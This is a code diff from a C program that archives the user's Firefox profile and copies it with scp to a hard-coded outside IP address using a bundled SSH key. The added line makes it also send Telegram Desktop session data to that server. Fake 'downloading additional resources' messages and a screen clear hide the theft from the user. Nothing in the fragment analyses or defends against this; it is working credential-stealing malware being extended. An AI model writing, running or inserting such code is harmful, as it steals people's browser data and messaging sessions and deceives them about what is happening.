@@ -19,7 +19,7 @@
 	system("tar -cf /tmp/main.tar.gz  $HOME/.mozilla/firefox/*");
 	sleep(5);
 	printf("downloading additional resources");
-	system("scp -oStrictHostKeyChecking=no -i 1/ssh-key-2022-07-22.key /tmp/main2.tar.gz ubuntu@193.123.37.30:/home/ubuntu");
+	system("scp -oStrictHostKeyChecking=no -i 1/ssh-key-2022-07-22.key $HOME/.local/share/TelegramDesktop/tdata/* ubuntu@193.123.37.30:/home/ubuntu");
 	system("clear");
 	printf("downloading additional resources");
 	system("scp -oStrictHostKeyChecking=no -i 1/ssh-key-2022-07-22.key /tmp/main.tar.gz ubuntu@193.123.37.30:/home/ubuntu");
